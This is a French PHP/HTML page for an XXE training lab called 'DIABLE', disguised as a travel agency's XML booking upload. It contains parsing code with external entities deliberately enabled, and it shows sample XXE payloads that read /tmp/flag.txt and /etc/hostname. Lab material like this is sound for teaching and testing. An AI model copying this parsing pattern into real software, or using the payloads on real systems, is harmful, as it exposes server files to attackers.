<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Upload XML - VoyagePlus</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header class="diable-header">
        <div class="header-content">
            <h1>✈️ VoyagePlus</h1>
            <p class="subtitle">Upload de fichier XML de réservation</p>
        </div>
    </header>

    <main class="container">
        <div class="warning-banner">
            ⚠️ Service d'upload XML - Version BETA
        </div>

        <section class="upload-section">
            <h2>📤 Uploader un fichier XML</h2>
            
            <div class="upload-card">
                <form method="POST" enctype="multipart/form-data" class="upload-form">
                    <div class="form-group">
                        <label for="xmlfile">Sélectionner un fichier XML :</label>
                        <input type="file" name="xmlfile" id="xmlfile" class="file-input" accept=".xml" required>
                    </div>
                    
                    <button type="submit" class="btn-primary">
                        Uploader et valider
                    </button>
                </form>

                <?php
                if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['xmlfile'])) {
                    $file_tmp = $_FILES['xmlfile']['tmp_name'];
                    $file_name = $_FILES['xmlfile']['name'];
                    
                    // Lire le contenu du fichier
                    $xml_input = file_get_contents($file_tmp);
                    
                    echo '<div class="result-box">';
                    echo '<h3>📋 Fichier: ' . htmlspecialchars($file_name) . '</h3>';
                    
                    // 🔴 VULNÉRABILITÉ XXE
                    libxml_disable_entity_loader(false);
                    $doc = new DOMDocument();
                    $doc->loadXML($xml_input, LIBXML_NOENT);
                    
                    echo '<h4>Contenu après validation :</h4>';
                    echo '<pre>' . htmlspecialchars($doc->saveXML()) . '</pre>';
                    
                    // Afficher spécifiquement le nom pour voir l'effet
                    $reservations = $doc->getElementsByTagName('nom');
                    if ($reservations->length > 0) {
                        echo '<div style="background: var(--bg-card); padding: 20px; margin-top: 20px; border-left: 4px solid var(--glow-color);">';
                        echo '<h4 style="color: var(--glow-color);">👤 NOM DU PASSAGER :</h4>';
                        echo '<p style="font-size: 2rem; font-weight: bold; text-align: center; color: var(--glow-color);">' . htmlspecialchars($reservations->item(0)->textContent) . '</p>';
                        echo '</div>';
                    }
                    
                    echo '</div>';
                }
                ?>

                <div style="margin-top: 20px;">
                    <p><strong>Fichiers XML de test :</strong></p>
                    
                    <details style="margin-bottom: 10px;">
                        <summary>📄 XML normal (reservation.xml)</summary>
                        <pre style="background: var(--bg-global); padding: 10px;">&lt;?xml version="1.0"?&gt;
&lt;reservation&gt;
    &lt;nom&gt;Jean Dupont&lt;/nom&gt;
    &lt;vol&gt;AF123&lt;/vol&gt;
    &lt;date&gt;2026-03-01&lt;/date&gt;
&lt;/reservation&gt;</pre>
                    </details>
                    
                    <details>
                        <summary>⚠️ XML malveillant (xxe.xml)</summary>
                        <pre style="background: var(--bg-global); padding: 10px; color: var(--error-color);">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY xxe SYSTEM "file:///tmp/flag.txt"&gt;
]&gt;
&lt;reservation&gt;
    &lt;nom&gt;&xxe;&lt;/nom&gt;
    &lt;vol&gt;AF123&lt;/vol&gt;
    &lt;date&gt;2026-03-01&lt;/date&gt;
&lt;/reservation&gt;</pre>
                        <p><strong>Résultat :</strong> Le nom devient "FLAG{XXE_Success_12345}"</p>
                    </details>
                </div>
            </div>
        </section>

        <section class="info-section">
            <details open>
                <summary>🎯 EFFET VISIBLE</summary>
                <div class="info-content">
                    <p>Le <strong>nom du passager</strong> est affiché en GRAND en bas du résultat.</p>
                    <p>Si l'attaque réussit, le nom devient le contenu du fichier volé !</p>
                    <p>Exemple avec fichier système :</p>
                    <pre>&lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;</pre>
                    <p>Le nom affiché sera le nom de la machine.</p>
                </div>
            </details>
        </section>
    </main>

    <footer class="diable-footer">
        <p>Lab DIABLE v3.0 - XXE Lab | Scénario 2: Upload XML avec effet visible</p>
    </footer>
</body>
</html>
